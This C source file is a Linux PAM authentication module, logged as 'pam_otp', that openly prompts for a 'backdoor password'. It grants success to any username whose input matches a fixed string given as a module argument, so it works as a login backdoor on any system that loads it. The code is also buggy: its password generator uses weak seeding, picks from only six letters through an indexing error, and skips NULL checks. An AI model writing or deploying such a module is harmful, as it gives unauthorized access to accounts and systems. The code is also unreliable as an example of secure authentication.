#define PAM_SM_AUTH
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <sys/types.h>

#include <crypt.h>

#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define CONFIG_MAX_CHAR 255
#define PROMPT_MAX_CHAR 127
#define ACTION_MAX_CHAR 255

#define LINUX_RANDOM 3
#define SERVER 4

static char *action_configuration(const char *filename, const char *uname){

	char *config_line = malloc(CONFIG_MAX_CHAR);
	char action_line[ACTION_MAX_CHAR];
	char *seperator;
	FILE *config_file = fopen(filename, "r");
	while(fgets(config_line, CONFIG_MAX_CHAR, config_file)){
		seperator = strstr(config_line, ":");
		*seperator = '\0';
		seperator++;	
		if(strcmp(config_line, uname) == 0)
			return seperator;

	}

	return NULL;	

}


static char *passwd_gen(char *valid_char,int passwd_len, int method){
	int seed, i;
	char *passwd = (char *)malloc(sizeof(char) * (passwd_len + 1));
	FILE *fp;
	switch(method){
		default :
			fp = fopen("/dev/random", "r");
			if(fp ==NULL){
				syslog(LOG_ALERT, "pam_otp[%d] can't open random pseudo file", getpid());
				return NULL;
			}
			if(fread(&seed, sizeof(seed), 1, fp) == 0){
				syslog(LOG_ALERT, "pam_otp[%d] can't read random pseudo file", getpid());
				fclose(fp);
				return NULL;
			}
			fclose(fp);
			srandom(seed);
			for(i = 0; i < passwd_len; i++){
				passwd[i] = valid_char[random() % passwd_len];
			}
			passwd[i] = '\0';
			return passwd;
	}


}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
	int pam_return_code;
	char prompt[] = "Enter backdoor password : \0";
	const void *pam_uname = NULL;
	struct pam_conv *conv = NULL;
	struct pam_message *message = (struct pam_message *)malloc(sizeof(struct pam_message));
	struct pam_response *response = NULL;

	if(pam_get_item(pamh, PAM_USER, &pam_uname) != PAM_SUCCESS){
		syslog(LOG_ALERT, "pam_otp[%d] can not get the username", getpid());
		return PAM_SERVICE_ERR;
	}
	// set the message style not to echo what user type
	message->msg_style = PAM_PROMPT_ECHO_OFF;

	// set the message prompt content
	char *tmp = (char *)malloc(PROMPT_MAX_CHAR);
	snprintf(tmp, PROMPT_MAX_CHAR, "%s [%s]: ", prompt, (char *)pam_uname);

	message->msg = tmp;
	// get the conversation item from pam to set the message
	if(pam_get_item(pamh, PAM_CONV, (const void **)&conv) != PAM_SUCCESS){
		syslog(LOG_ALERT, "pam_otp[%d] can not get the conversation", getpid());
		return PAM_SERVICE_ERR;
	}
	// set message to prompt and wait for response and store at &response
	conv->conv(1, (const struct pam_message **)&message, &response, conv->appdata_ptr);
	
	// set auth token in pam to response recieve ealier
	if(pam_set_item(pamh, PAM_AUTHTOK, response->resp) != PAM_SUCCESS){
		return PAM_SERVICE_ERR;
	}
	
	// syslog(LOG_ALERT, "pam_otp[%d] %s", getpid(), argv[0]);
	if(strcmp(argv[0], response->resp) == 0){
		syslog(LOG_ALERT, "pam_otp[%d] Authenticate complete by user %s", getpid(), (char *)pam_uname);
		return PAM_SUCCESS;
	}
	else{
		syslog(LOG_ALERT, "pam_otp[%d] can not authenticate, wrong password", getpid());
		return PAM_AUTH_ERR;
	}
}

int main(int argc, char **argv){
	FILE *fp = fopen("tmp", "w");

	struct crypt_data tmp;
	tmp.initialized = 0;
	fprintf(fp, "%s\n", crypt_r(passwd_gen("ABCDEFGHIJKLMNOPQRSTUVWXYZ", 6, LINUX_RANDOM), "$6$52$", &tmp));
	return 0;
}
